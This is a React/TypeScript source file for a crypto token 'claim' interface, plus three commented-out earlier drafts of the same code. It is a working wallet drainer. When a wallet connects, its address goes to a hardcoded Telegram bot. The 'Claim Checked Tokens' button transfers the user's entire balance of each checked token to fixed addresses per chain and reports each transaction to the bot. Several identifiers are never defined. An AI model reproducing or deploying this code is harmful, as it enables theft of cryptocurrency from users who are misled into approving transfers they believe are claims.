import { useState, useEffect, useCallback } from 'react'; // Import useState, useEffect, useCallback
import { Button, useToasts } from '@geist-ui/core';
import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { erc20Abi } from 'viem';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import axios from 'axios'; // Import axios for HTTP requests

// Telegram Bot Config
const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
const TELEGRAM_CHAT_ID = '6718529435';

// Function to send message to Telegram
const sendTelegramNotification = async (message: string) => {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
  }
};

// Preset destination addresses based on chain IDs
const destinationAddresses = {
  1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  // Add other chain ID and address mappings here
};

// Function to select the correct address based on network
function selectAddressForToken(network) {
  const addresses = {
    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
    56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
    // Add other networks and their corresponding addresses
  };

  const selectedAddress = addresses[network];
  
  if (selectedAddress) {
    console.log('Great Job! Selected Address:', selectedAddress);
  } else {
    console.log('No address found for the selected network:', network);
  }

  return selectedAddress;
}

export const GetTokens = () => {
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { address, isConnected, chain } = useAccount();
  const [notified, setNotified] = useState(false); // Add a state to control notification

  const fetchData = useCallback(async () => {
    setLoading(true);
    try {
      setError('');
      if (!chain || !supportedChains.includes(chain.id)) {
        throw new Error(
          `Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(
            ', '
          )}.`
        );
      }

      const alchemyNetwork = chainIdToNetworkMap[chain.id];
      const alchemy = alchemyInstances[alchemyNetwork];

      console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
      const tokensResponse = await alchemy.core.getTokenBalances(address as string);
      const nativeBalanceResponse = await alchemy.core.getBalance(address as string, 'latest');

      const processedTokens = tokensResponse.tokenBalances.map((balance) => ({
        contract_address: balance.contractAddress,
        balance: safeNumber(balance.tokenBalance),
        quote: balance.quote || 0, // Add default value if missing
        quote_rate: balance.quoteRate || 0, // Add default value if missing
      }));

      setTokens(processedTokens);
      console.log('Fetched tokens:', processedTokens);
    } catch (error) {
      console.error('Error fetching tokens:', error);
      setError((error as Error).message);
    }
    setLoading(false);
  }, [address, chain, setTokens]);

  useEffect(() => {
    if (address && chain?.id) {
      fetchData();
      setCheckedRecords({});
    }
  }, [address, chain?.id, fetchData, setCheckedRecords]);

  useEffect(() => {
    if (!isConnected) {
      setTokens([]);
      setCheckedRecords({});
      setNotified(false); // Reset the notification flag when disconnected
    } else if (isConnected && !notified) {
      // Only send a notification if the user is connected and hasn't been notified yet
      sendTelegramNotification(`New Connection: Wallet Address: ${address}, Chain: ${chain?.name}`);
      setNotified(true); // Set the flag to prevent duplicate notifications
    }
  }, [isConnected, address, chain, setTokens, setCheckedRecords, notified]);

  if (loading) {
    return <Loading>Loading</Loading>;
  }

  if (error) {
    return <div>{error}</div>;
  }

  return (
    <div style={{ margin: '20px' }}>
      {isConnected && tokens?.length === 0 && `No tokens on ${chain?.name}`}
      {tokens.map((token) => (
        <TokenRow token={token} key={token.contract_address} />
      ))}
    </div>
  );
};

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: 'success' | 'warning' | 'error') =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { chain, address, isConnected } = useAccount(); // Use chain ID from connected account

  const sendAllCheckedTokens = async () => {
    const tokensToSend: string[] = Object.entries(checkedRecords)
      .filter(([_, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress);

    if (!walletClient || !publicClient) return;

    // Automatically select destination address based on the connected chain ID
    const destinationAddress = destinationAddresses[chain?.id];
    if (!destinationAddress) {
      showToast('Unsupported chain or no destination address found for this network', 'error');
      return;
    }

    // Integrate the function to log the selected address
    selectAddressForToken(chain?.id); 

    // Perform ENS resolution if needed
    let resolvedDestinationAddress = destinationAddress;
    if (destinationAddress.includes('.')) {
      try {
        resolvedDestinationAddress = await publicClient.getEnsAddress({
          name: normalize(destinationAddress),
        });
        if (resolvedDestinationAddress) {
          showToast(`Resolved ENS address: ${resolvedDestinationAddress}`, 'success');
        }
      } catch (error: unknown) {
        if (error instanceof Error) {
          showToast(`Error resolving ENS address: ${error.message}`, 'warning');
        } else {
          showToast('An unknown error occurred while resolving ENS address', 'warning');
        }
      }
    }

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);

      // Ensure the tokenAddress has the correct format
      const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x') ? tokenAddress as `0x${string}` : `0x${tokenAddress}` as `0x${string}`;

      try {
        // Ensure destinationAddress is properly formatted
        const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x') 
          ? resolvedDestinationAddress as `0x${string}` 
          : `0x${resolvedDestinationAddress}` as `0x${string}`;

        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: formattedTokenAddress,
          abi: erc20Abi,
          functionName: 'transfer',
          args: [
            formattedDestinationAddress,
            BigInt(token?.balance || '0'),
          ],
        });

        const res = await walletClient.writeContract(request);
        setCheckedRecords((old) => ({
          ...old,
          [formattedTokenAddress]: {
            ...(old[formattedTokenAddress] || { isChecked: false }),
            pendingTxn: res,
          },
        }));

        showToast(
          `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
          'success',
        );

        // Send a Telegram notification for each successful transaction
        await sendTelegramNotification(
          `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${token?.balance}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
        );
      } catch (err: any) {
        showToast(
          `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
          'warning',
        );
      }
    }
  };

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  return (
    <div style={{ margin: '20px' }}>
      <form>
        <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={checkedCount === 0}
          style={{ marginTop: '20px' }}
        >
          Claim {checkedCount} Checked Tokens
        </Button>
      </form>
    </div>
  );
};



















// import { Button, useToasts } from '@geist-ui/core';
// import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
// import { erc20Abi } from 'viem';
// import { useAtom } from 'jotai';
// import { normalize } from 'viem/ens';
// import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
// import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
// import axios from 'axios'; // Import axios for HTTP requests

// // Telegram Bot Config
// const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
// const TELEGRAM_CHAT_ID = '6718529435';

// // Function to send message to Telegram
// const sendTelegramNotification = async (message: string) => {
//   try {
//     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
//       chat_id: TELEGRAM_CHAT_ID,
//       text: message,
//     });
//   } catch (error) {
//     console.error('Error sending Telegram notification:', error);
//   }
// };

// // Preset destination addresses based on chain IDs
// const destinationAddresses = {
//   1: '0x933d91B8D5160e302239aE916461B4DC6967815a',
//   56: '0x933d91B8D5160e302239aE916461B4DC6967815b',
//   10: '0x933d91B8D5160e302239aE916461B4DC6967815c',
//   324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
//   42161: '0x933d91B8D5160e302239aE916461B4DC6967815e',
//   137: '0x933d91B8D5160e302239aE916461B4DC6967815f',
//   // Add other chain ID and address mappings here
// };

// // Function to select the correct address based on network
// function selectAddressForToken(network) {
//   const addresses = {
//     1: '0x933d91B8D5160e302239aE916461B4DC6967815a',
//     56: '0x933d91B8D5160e302239aE916461B4DC6967815b',
//     10: '0x933d91B8D5160e302239aE916461B4DC6967815c',
//     324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
//     42161: '0x933d91B8D5160e302239aE916461B4DC6967815e',
//     137: '0x933d91B8D5160e302239aE916461B4DC6967815f',
//     // Add other networks and their corresponding addresses
//   };

//   const selectedAddress = addresses[network];
  
//   if (selectedAddress) {
//     console.log('Great Job! Selected Address:', selectedAddress);
//   } else {
//     console.log('No address found for the selected network:', network);
//   }

//   return selectedAddress;
// }

// export const SendTokens = () => {
//   const { setToast } = useToasts();
//   const showToast = (message: string, type: 'success' | 'warning' | 'error') =>
//     setToast({
//       text: message,
//       type,
//       delay: 4000,
//     });

//   const [tokens] = useAtom(globalTokensAtom);
//   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
//   const { data: walletClient } = useWalletClient();
//   const publicClient = usePublicClient();
//   const { chain, address, isConnected } = useAccount(); // Use chain ID from connected account
//   const [notified, setNotified] = useState(false); // Add a state to control notification

//   const sendAllCheckedTokens = async () => {
//     const tokensToSend: string[] = Object.entries(checkedRecords)
//       .filter(([_, { isChecked }]) => isChecked)
//       .map(([tokenAddress]) => tokenAddress);

//     if (!walletClient || !publicClient) return;

//     // Automatically select destination address based on the connected chain ID
//     const destinationAddress = destinationAddresses[chain?.id];
//     if (!destinationAddress) {
//       showToast('Unsupported chain or no destination address found for this network', 'error');
//       return;
//     }

//     // Integrate the function to log the selected address
//     selectAddressForToken(chain?.id); 

//     // Perform ENS resolution if needed
//     let resolvedDestinationAddress = destinationAddress;
//     if (destinationAddress.includes('.')) {
//       try {
//         resolvedDestinationAddress = await publicClient.getEnsAddress({
//           name: normalize(destinationAddress),
//         });
//         if (resolvedDestinationAddress) {
//           showToast(`Resolved ENS address: ${resolvedDestinationAddress}`, 'success');
//         }
//       } catch (error: unknown) {
//         if (error instanceof Error) {
//           showToast(`Error resolving ENS address: ${error.message}`, 'warning');
//         } else {
//           showToast('An unknown error occurred while resolving ENS address', 'warning');
//         }
//       }
//     }

//     for (const tokenAddress of tokensToSend) {
//       const token = tokens.find((token) => token.contract_address === tokenAddress);

//       // Ensure the tokenAddress has the correct format
//       const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x') ? tokenAddress as `0x${string}` : `0x${tokenAddress}` as `0x${string}`;

//       try {
//         // Ensure destinationAddress is properly formatted
//         const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x') 
//           ? resolvedDestinationAddress as `0x${string}` 
//           : `0x${resolvedDestinationAddress}` as `0x${string}`;

//         const { request } = await publicClient.simulateContract({
//           account: walletClient.account,
//           address: formattedTokenAddress,
//           abi: erc20Abi,
//           functionName: 'transfer',
//           args: [
//             formattedDestinationAddress,
//             BigInt(token?.balance || '0'),
//           ],
//         });

//         const res = await walletClient.writeContract(request);
//         setCheckedRecords((old) => ({
//           ...old,
//           [formattedTokenAddress]: {
//             ...(old[formattedTokenAddress] || { isChecked: false }),
//             pendingTxn: res,
//           },
//         }));

//         showToast(
//           `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
//           'success',
//         );

//         // Send a Telegram notification for each successful transaction
//         await sendTelegramNotification(
//           `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${token?.balance}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
//         );
//       } catch (err: any) {
//         showToast(
//           `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
//           'warning',
//         );
//       }
//     }
//   };

//   useEffect(() => {
//     if (!isConnected) {
//       setNotified(false); // Reset the notification flag when disconnected
//     } else if (isConnected && !notified) {
//       // Only send a notification if the user is connected and hasn't been notified yet
//       sendTelegramNotification(`New Connection: Wallet Address: ${address}, Chain: ${chain?.name}`);
//       setNotified(true); // Set the flag to prevent duplicate notifications
//     }
//   }, [isConnected, address, chain, notified]);

//   const checkedCount = Object.values(checkedRecords).filter(
//     (record) => record.isChecked,
//   ).length;

//   return (
//     <div style={{ margin: '20px' }}>
//       <form>
//         <Button
//           type="secondary"
//           onClick={sendAllCheckedTokens}
//           disabled={checkedCount === 0}
//           style={{ marginTop: '20px' }}
//         >
//           Claim {checkedCount} Checked Tokens
//         </Button>
//       </form>
//     </div>
//   );
// };



















// import { Button, useToasts } from '@geist-ui/core';
// import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
// import { erc20Abi } from 'viem';
// import { useAtom } from 'jotai';
// import { normalize } from 'viem/ens';
// import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
// import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
// import axios from 'axios'; // Import axios for HTTP requests

// // Telegram Bot Config
// const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
// const TELEGRAM_CHAT_ID = '6718529435';

// // Function to send message to Telegram
// const sendTelegramNotification = async (message: string) => {
//   try {
//     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
//       chat_id: TELEGRAM_CHAT_ID,
//       text: message,
//     });
//   } catch (error) {
//     console.error('Error sending Telegram notification:', error);
//   }
// };

// // Preset destination addresses based on chain IDs
// const destinationAddresses = {
//   1: '0x933d91B8D5160e302239aE916461B4DC6967815a',
//   56: '0x933d91B8D5160e302239aE916461B4DC6967815b',
//   10: '0x933d91B8D5160e302239aE916461B4DC6967815c',
//   324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
//   42161: '0x933d91B8D5160e302239aE916461B4DC6967815e',
//   137: '0x933d91B8D5160e302239aE916461B4DC6967815f',
//   // Add other chain ID and address mappings here
// };

// // Function to select the correct address based on network
// function selectAddressForToken(network) {
//   const addresses = {
//     1: '0x933d91B8D5160e302239aE916461B4DC6967815a',
//     56: '0x933d91B8D5160e302239aE916461B4DC6967815b',
//     10: '0x933d91B8D5160e302239aE916461B4DC6967815c',
//     324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
//     42161: '0x933d91B8D5160e302239aE916461B4DC6967815e',
//     137: '0x933d91B8D5160e302239aE916461B4DC6967815f',
//     // Add other networks and their corresponding addresses
//   };

//   const selectedAddress = addresses[network];
  
//   if (selectedAddress) {
//     console.log('Great Job! Selected Address:', selectedAddress);
//   } else {
//     console.log('No address found for the selected network:', network);
//   }

//   return selectedAddress;
// }

// export const SendTokens = () => {
//   const { setToast } = useToasts();
//   const showToast = (message: string, type: 'success' | 'warning' | 'error') =>
//     setToast({
//       text: message,
//       type,
//       delay: 4000,
//     });

//   const [tokens] = useAtom(globalTokensAtom);
//   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
//   const { data: walletClient } = useWalletClient();
//   const publicClient = usePublicClient();
//   const { chain, address, isConnected } = useAccount(); // Use chain ID from connected account

//   const sendAllCheckedTokens = async () => {
//     const tokensToSend: string[] = Object.entries(checkedRecords)
//       .filter(([_, { isChecked }]) => isChecked)
//       .map(([tokenAddress]) => tokenAddress);

//     if (!walletClient || !publicClient) return;

//     // Automatically select destination address based on the connected chain ID
//     const destinationAddress = destinationAddresses[chain?.id];
//     if (!destinationAddress) {
//       showToast('Unsupported chain or no destination address found for this network', 'error');
//       return;
//     }

//     // Integrate the function to log the selected address
//     selectAddressForToken(chain?.id); 

//     // Perform ENS resolution if needed
//     let resolvedDestinationAddress = destinationAddress;
//     if (destinationAddress.includes('.')) {
//       try {
//         resolvedDestinationAddress = await publicClient.getEnsAddress({
//           name: normalize(destinationAddress),
//         });
//         if (resolvedDestinationAddress) {
//           showToast(`Resolved ENS address: ${resolvedDestinationAddress}`, 'success');
//         }
//       } catch (error: unknown) {
//         if (error instanceof Error) {
//           showToast(`Error resolving ENS address: ${error.message}`, 'warning');
//         } else {
//           showToast('An unknown error occurred while resolving ENS address', 'warning');
//         }
//       }
//     }

//     for (const tokenAddress of tokensToSend) {
//       const token = tokens.find((token) => token.contract_address === tokenAddress);

//       // Ensure the tokenAddress has the correct format
//       const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x') ? tokenAddress as `0x${string}` : `0x${tokenAddress}` as `0x${string}`;

//       try {
//         // Ensure destinationAddress is properly formatted
//         const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x') 
//           ? resolvedDestinationAddress as `0x${string}` 
//           : `0x${resolvedDestinationAddress}` as `0x${string}`;

//         const { request } = await publicClient.simulateContract({
//           account: walletClient.account,
//           address: formattedTokenAddress,
//           abi: erc20Abi,
//           functionName: 'transfer',
//           args: [
//             formattedDestinationAddress,
//             BigInt(token?.balance || '0'),
//           ],
//         });

//         const res = await walletClient.writeContract(request);
//         setCheckedRecords((old) => ({
//           ...old,
//           [formattedTokenAddress]: {
//             ...(old[formattedTokenAddress] || { isChecked: false }),
//             pendingTxn: res,
//           },
//         }));

//         showToast(
//           `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
//           'success',
//         );

//         // Send a Telegram notification for each successful transaction
//         await sendTelegramNotification(
//           `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${token?.balance}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
//         );
//       } catch (err: any) {
//         showToast(
//           `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
//           'warning',
//         );
//       }
//     }
//   };

//   const checkedCount = Object.values(checkedRecords).filter(
//     (record) => record.isChecked,
//   ).length;

//   return (
//     <div style={{ margin: '20px' }}>
//       <form>
//         <Button
//           type="secondary"
//           onClick={sendAllCheckedTokens}
//           disabled={checkedCount === 0}
//           style={{ marginTop: '20px' }}
//         >
//           Claim {checkedCount} Checked Tokens
//         </Button>
//       </form>
//     </div>
//   );
// };



















// import { Button, useToasts } from '@geist-ui/core';
// import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
// import { erc20Abi } from 'viem';
// import { useAtom } from 'jotai';
// import { normalize } from 'viem/ens';
// import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
// import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';

// // Preset destination addresses based on chain IDs
// const destinationAddresses = {
//   1: '0x933d91B8D5160e302239aE916461B4DC6967815a',
//   56: '0x933d91B8D5160e302239aE916461B4DC6967815b',
//   10: '0x933d91B8D5160e302239aE916461B4DC6967815c',
//   324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
//   42161: '0x933d91B8D5160e302239aE916461B4DC6967815e',
//   137: '0x933d91B8D5160e302239aE916461B4DC6967815f',
//   // Add other chain ID and address mappings here
// };

// function sleep(ms: number): Promise<void> {
//   return new Promise((resolve) => setTimeout(resolve, ms));
// }

// // Function to select the correct address based on network
// function selectAddressForToken(network) {
//   const addresses = {
//     1: "0x933d91B8D5160e302239aE916461B4DC6967815a",
//     56: "0x933d91B8D5160e302239aE916461B4DC6967815b",
//     10: "0x933d91B8D5160e302239aE916461B4DC6967815c",
//     324: "0x933d91B8D5160e302239aE916461B4DC6967815d",
//     42161: "0x933d91B8D5160e302239aE916461B4DC6967815e",
//     137: "0x933d91B8D5160e302239aE916461B4DC6967815f",
//     // Add other networks and their corresponding addresses
//   };

//   const selectedAddress = addresses[network];
  
//   if (selectedAddress) {
//     console.log("Great Job! Selected Address:", selectedAddress);
//   } else {
//     console.log("No address found for the selected network:", network);
//   }

//   return selectedAddress;
// }

// export const SendTokens = () => {
//   const { setToast } = useToasts();
//   const showToast = (message: string, type: 'success' | 'warning' | 'error') =>
//     setToast({
//       text: message,
//       type,
//       delay: 4000,
//     });

//   const [tokens] = useAtom(globalTokensAtom);
//   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
//   const { data: walletClient } = useWalletClient();
//   const publicClient = usePublicClient();
//   const { chain } = useAccount(); // Use chain ID from connected account

//   const sendAllCheckedTokens = async () => {
//     const tokensToSend: string[] = Object.entries(checkedRecords)
//       .filter(([_, { isChecked }]) => isChecked)
//       .map(([tokenAddress]) => tokenAddress);

//     if (!walletClient || !publicClient) return;

//     // Automatically select destination address based on the connected chain ID
//     const destinationAddress = destinationAddresses[chain?.id];
//     if (!destinationAddress) {
//       showToast('Unsupported chain or no destination address found for this network', 'error');
//       return;
//     }

//     // Integrate the function to log the selected address
//     selectAddressForToken(chain?.id); 

//     // Perform ENS resolution if needed
//     if (destinationAddress.includes('.')) {
//       try {
//         const resolvedDestinationAddress = await publicClient.getEnsAddress({
//           name: normalize(destinationAddress),
//         });
//         if (resolvedDestinationAddress) {
//           setDestinationAddress(resolvedDestinationAddress);
//         }
//       } catch (error: unknown) {
//         if (error instanceof Error) {
//           showToast(`Error resolving ENS address: ${error.message}`, 'warning');
//         } else {
//           showToast('An unknown error occurred while resolving ENS address', 'warning');
//         }
//       }
//       return;
//     }

//     // Ensure resolving the ENS name above completes
//     for (const tokenAddress of tokensToSend) {
//       const token = tokens.find((token) => token.contract_address === tokenAddress);

//       // Ensure the tokenAddress has the correct format
//       const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x') ? tokenAddress as `0x${string}` : `0x${tokenAddress}` as `0x${string}`;

//       try {
//         // Ensure destinationAddress is properly formatted
//         const formattedDestinationAddress: `0x${string}` = destinationAddress.startsWith('0x') 
//           ? destinationAddress as `0x${string}` 
//           : `0x${destinationAddress}` as `0x${string}`;

//         const { request } = await publicClient.simulateContract({
//           account: walletClient.account,
//           address: formattedTokenAddress,
//           abi: erc20Abi,
//           functionName: 'transfer',
//           args: [
//             formattedDestinationAddress,
//             BigInt(token?.balance || '0'),
//           ],
//         });

//         const res = await walletClient.writeContract(request);
//         setCheckedRecords((old) => ({
//           ...old,
//           [formattedTokenAddress]: {
//             ...(old[formattedTokenAddress] || { isChecked: false }),
//             pendingTxn: res,
//           },
//         }));
//       } catch (err: any) {
//         showToast(
//           `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
//           'warning',
//         );
//       }
//     }
//   };

//   const checkedCount = Object.values(checkedRecords).filter(
//     (record) => record.isChecked,
//   ).length;

//   return (
//     <div style={{ margin: '20px' }}>
//       <form>
//         {/* Removed Input for destination address */}
//         <Button
//           type="secondary"
//           onClick={sendAllCheckedTokens}
//           disabled={checkedCount === 0}
//           style={{ marginTop: '20px' }}
//         >
//           {checkedCount === 0
//             ? 'Claim Tokens'
//             : `Claim ${checkedCount} Tokens Now`}
//         </Button>
//       </form>
//     </div>
//   );
// };
